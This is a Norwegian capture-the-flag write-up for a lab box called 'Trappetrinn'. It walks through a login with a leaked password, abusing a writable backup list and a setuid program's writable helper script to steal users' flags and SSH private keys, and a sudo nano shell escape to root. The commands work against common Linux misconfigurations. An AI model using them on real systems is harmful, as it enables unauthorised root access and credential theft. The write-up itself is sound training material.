# Trappetrinn

Oppgave: 
```
login@corax ~/2_Oppdrag/2.1_Trappetrinn $ cat LESMEG.md 
Vi har avdekket en mulig bedrift som kan være knyttet til Utlandia, og har funnet et av passordene
til en avde ansatte i en offentlig tilgjengelig, lekket database.
Det er ditt oppdrag å innhente informasjon som avklarer om det foreligger en slik tilknytning eller ikke.
Passordet er Bubbles2021

'''
ssh sarah@trappetrinn
'''
```

Her er det bare å logge inn som sarah og se hva vi finner:

## Sara
```
sarah@trappetrinn:~$ ls -al
total 16
drwxr-x---. 1 sarah sarah   37 Jan  4 14:37 .
drwxr-xr-x. 1 root  root    45 Dec 19 15:39 ..
-rw-r--r--. 1 sarah sarah  220 Jan  6  2022 .bash_logout
-rw-r--r--. 1 sarah sarah 3771 Jan  6  2022 .bashrc
drwx------. 2 sarah sarah   34 Jan  4 14:37 .cache
-rw-r--r--. 1 sarah sarah  807 Jan  6  2022 .profile
-rw-r--r--. 1 sarah sarah   33 Jan  4 12:55 sarah.txt

sarah@trappetrinn:~$ cat sarah.txt 
FLAGG 
```

Vi oppdager saraah.txt, som inneholder flagget vi kan levere inn. Filnavnet gir oss også en pekepinn om hva som kommer videre – mest sannsynlig skal vi også finne david.txt, priya.txt og root.txt. Men for å komme videre trenger vi bedre rettigheter. La oss derfor lete etter filer vi har skrivetilgang til. Det gjør vi med: "find / -writable -type f 2>/dev/null"

```
sarah@trappetrinn:/etc$ find / -writable -type f 2>/dev/null
/opt/projects/projectAtla/backup/filesToBackup
/opt/projects/projectAtla/projectPlan.txt
/opt/projects/projectAtla/NoteFromDavid.md

sarah@trappetrinn:~$ cd /opt/projects/projectAtla/

sarah@trappetrinn:~$ cat NoteFromDavid.md
Sarah,

I've set up a temporary backup script for important files related to the project.
It runs automatically every minute.

The script reads the path to back up from the 'filesToBackup' file in the backup folder.
If you want to back up any files, just add them to that file.
Make sure there is a newline between the file paths though, or it won't work.

It's just a simple hack until I get the proper backup runner finished.

— David
```

Dette gir oss akkurat det vi trenger: en cron-jobb som kjører et script eid av David. Kanskje vi kan bruke dette til å hente ut david.txt? Det er i hvert fall planen! 
Så vi prøver nettopp det – vi lager en liten modifikasjon i skriptet slik at det leser ut david.txt.

```
sarah@trappetrinn:/etc$ cd /opt/projects/projectAtla

nano:
GNU nano 6.2  filesToBackup
/opt/projects/projectAtla/projectPlan.txt
/home/david/david.txt

....  A FEW MOMENTS LATER  ....

sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ ls
david.txt  projectPlan.txt

sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ cat david.txt
FLAGG
```

Hurra! Det fungerte helt perfekt. Men dessverre var det ingen hint i david.txt om hvordan vi skal gå videre. Da prøver vi heller å logge inn som David.
Siden vi nå har mulighet til å hente ut filer som eies av David, forsøker vi å trekke ut SSH-nøkkelen hans.

```
sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ ls
david.txt  id_rsa  projectPlan.txt

sarah@trappetrinn:/opt/projects/projectAtla/backup/files$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEArceViBNlqPYZ8QihU3WNtAYRExu5T0E+m6FD0lobD57qUbU4FeVy
I71Xb/OgQl5gzPQJK4OG8vukkR7wuGmVgdHCDXqii+RdZHdq6OUYG5NZpTcqDxgBDjnjOL
...
...
...
YCAq3DoPbT/w2jOww9MhNXzpLfGXrgrQUfb7LEiTsdCGAbjoamjcDqwFDhAExrOUxcxTyZ
oCce3oLJo763AAAACm9vZ3dheUBOcGM=
-----END OPENSSH PRIVATE KEY-----


sarah@trappetrinn:/tmp$ nano rsa_key
sarah@trappetrinn:/tmp$ chmod 600 rsa_key
sarah@trappetrinn:/tmp$ ssh -i rsa_key david@trappetrinn
```

Volla! Nå er vi logget inn som David! Vi gjør akkuarat det samme som vi gjorde hos Sarah: "find / -writable -type f 2>/dev/null"

## David
```
david@trappetrinn:~$ find / -writable -type f 2>/dev/null
/opt/senior-tools/helper-scripts/NoteFromPriya.md
/opt/senior-tools/helper-scripts/helper.sh

david@trappetrinn:~$ cd /opt/senior-tools
david@trappetrinn:/opt/senior-tools$ ls -al
total 0
drwxrwx---. 1 priya seniorteam 28 Dec 19 15:39 .
drwxr-xr-x. 1 root  root       22 Dec 19 15:39 ..
drwxr-xr-x. 1 root  root       23 Dec 19 15:39 helper-scripts
drwxrwx---. 1 priya seniorteam 23 Dec 19 15:39 programs
drwxrwx---. 2 priya seniorteam  6 Dec 19 15:39 scripts

david@trappetrinn:/opt/senior-tools/programs$ cd helper-scripts/
david@trappetrinn:/opt/senior-tools/programs$ cat NoteFromPriya.md
David,

This is a folder to put helper scripts into.
Mainly smaller scripts that perform specific functions that you can use with bigger scripts or programs.
For example, the runTask program I made, which makes use of helper.sh. 
It just helps save us some time not having to recode everything.

— Priya

david@trappetrinn:/opt/senior-tools$ ls -al programs/
total 20
drwxrwx---. 1 priya seniorteam    23 Dec 19 15:39 .
drwxrwx---. 1 priya seniorteam    28 Dec 19 15:39 ..
-rwsr-x---. 1 priya seniorteam 15960 Dec 18 10:18 runTask
-rwsr-x---. 1 priya seniorteam   147 Dec 18 10:18 runTask.c

david@trappetrinn:/opt/senior-tools$ cat programs/runTask.c
#include <stdlib.h>
#include <unistd.h>

int main() {
    execl("/opt/senior-tools/helper-scripts/helper.sh", "helper.sh", NULL);

    return 0;
}

```

Nå ser vi etter filer David kan skrive til. Blant dem finner vi helper.sh. 
La oss redigere dette skriptet og forsøke samme metode som tidligere – vi prøver å lese ut priya.txt og se etter priyas SSH-nøkkel.

```
nano:
GNU nano 6.2  helper.sh
#!/bin/bash -p
cat /home/priya/priya.txt
ls -la /home/priya/.ssh/


david@trappetrinn:/opt/senior-tools$ programs/runTask
FLAGG
total 12
drwx------. 1 priya priya   29 Dec 19 15:39 .
drwxr-x---. 1 priya priya   23 Dec 19 15:39 ..
-rw-------. 1 priya priya  392 Dec 19 15:39 authorized_keys
-rw-------. 1 priya priya 1811 Dec 18 10:18 id_rsa
-rw-r--r--. 1 priya priya  392 Dec 18 10:18 id_rsa.pub
```

Volla! Vi fikk neste flagg, og vi kan hente ut SSH-nøkkelen og logge inn som priya! La oss se hva som venter oss videre…

## Priya
```
priya@trappetrinn:~$ sudo -l
Matching Defaults entries for priya on trappetrinn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User priya may run the following commands on trappetrinn:
    (ALL) NOPASSWD: /usr/bin/nano

```

Her var jeg svært heldig – vi kan kjøre sudo nano uten passord! A got root!!! 
Åpne nano, trykk **Ctrl + R**, trykk deretter **Ctrl + X**, skriv inn "reset; sh 1>&0 2>&0" og ...... BOOM – vi har et shell som root! 

```
ls
priya.txt
cd ..
ls
david  julia  michael  priya  sarah
cd
ls
root.txt
cat root.txt
FLAGG
```


Who knew privilege escalation could be this fun !!!!!

